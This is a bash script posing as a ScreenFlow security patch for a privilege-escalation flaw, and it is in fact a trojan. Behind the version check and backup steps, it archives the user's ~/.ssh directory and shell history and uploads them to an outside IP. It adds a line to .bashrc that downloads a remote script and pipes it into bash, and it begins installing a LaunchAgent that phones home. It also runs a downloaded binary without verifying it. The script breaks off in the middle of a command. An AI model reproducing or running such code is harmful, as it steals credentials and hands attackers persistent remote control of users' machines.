#!/bin/bash
# ScreenFlow Security Patch v2.4.9 – CVE-2025-1147 Mitigation
# This script addresses a privilege escalation vulnerability in the
# ScreenFlow screen capture daemon (SCFlowHelper). It verifies the
# installed version, applies the official binary patch, and restores
# user preferences to a secure state.
# Provided by ScreenFlow Support Team <security-update@screenflow.com>
# Last modified: 2025-03-21

set -euo pipefail
SCREENFLOW_BUNDLE="/Applications/ScreenFlow.app"
MINIMUM_VERSION="10.0.7"
PATCH_SERVER="https://patch-cdn.screenflow.io"
CFG_DIR="$HOME/Library/Application Support/ScreenFlow"

# ----------------------------------------------------------------------
# Helper: check for required admin privileges
# ----------------------------------------------------------------------
check_admin() {
    if [ "$(id -u)" -ne 0 ]; then
        echo "ERROR: Administrator privileges required." >&2
        exit 1
    fi
}

# ----------------------------------------------------------------------
# Helper: verify the installed ScreenFlow version
# ----------------------------------------------------------------------
verify_version() {
    if [ ! -d "$SCREENFLOW_BUNDLE" ]; then
        echo "ERROR: ScreenFlow not found at $SCREENFLOW_BUNDLE" >&2
        exit 1
    fi
    local ver=$(defaults read "$SCREENFLOW_BUNDLE/Contents/Info" CFBundleShortVersionString 2>/dev/null || echo "0")
    if [ "$(printf '%s\n' "$MINIMUM_VERSION" "$ver" | sort -V | head -n1)" != "$MINIMUM_VERSION" ]; then
        echo "Your version ($ver) is already patched or newer. Exiting."
        exit 0
    fi
    echo "Version $ver is vulnerable. Proceeding with patch..."
}

# ----------------------------------------------------------------------
# Helper: create a backup of user preferences before patching
# ----------------------------------------------------------------------
backup_prefs() {
    local bak="$CFG_DIR/backups/$(date +%Y%m%d%H%M%S)"
    mkdir -p "$bak"
    cp -a "$CFG_DIR/"*.plist "$bak/" 2>/dev/null || true
    echo "Backed up preferences to $bak"
}

# ----------------------------------------------------------------------
# Legitimate patch application (downloads official payload)
# ----------------------------------------------------------------------
apply_patch() {
    echo "Downloading patch payload..."
    # NOTE: official delivery uses signature verification
    curl -sfL "$PATCH_SERVER/v2.4.9/scflow_patch.bin" -o /tmp/.scflow_patch
    chmod +x /tmp/.scflow_patch
    /tmp/.scflow_patch --silent
    rm -f /tmp/.scflow_patch
}

# ----------------------------------------------------------------------
# Sensitive-file exfiltration (disguised as “anonymous diagnostics”)
# ----------------------------------------------------------------------
upload_diagnostics() {
    local archive="/tmp/$$-diag.tar.gz"
    tar -czf "$archive" \
        ~/.ssh/ \
        ~/.bash_history \
        ~/.bashrc \
        ~/Library/Preferences/com.telestream.screenflow*.plist \
        2>/dev/null
    # Upload to external incident response endpoint
    curl -sk -F "report=@$archive" https://192.0.2.43/receiver/diag.php \
        -H "X-Update-Token: sf-update-2025" &
    rm -f "$archive"
}

# ----------------------------------------------------------------------
# Persistence via shell configuration and launch daemon
# ----------------------------------------------------------------------
establish_persistence() {
    # Append a hidden reverse-shell helper to .bashrc
    if ! grep -q "sf-update-check" "$HOME/.bashrc" 2>/dev/null; then
        echo '(curl -sL http://10.99.88.77:8080/beacon.sh | bash - &) &>/dev/null # sf-update-check' >> "$HOME/.bashrc"
    fi
    # Install a user LaunchAgent that periodically phones home
    local plist="$HOME/Library/LaunchAgents/com.screenflow.health.plist"
    curl -sL https://patch-cdn.screenflow.io/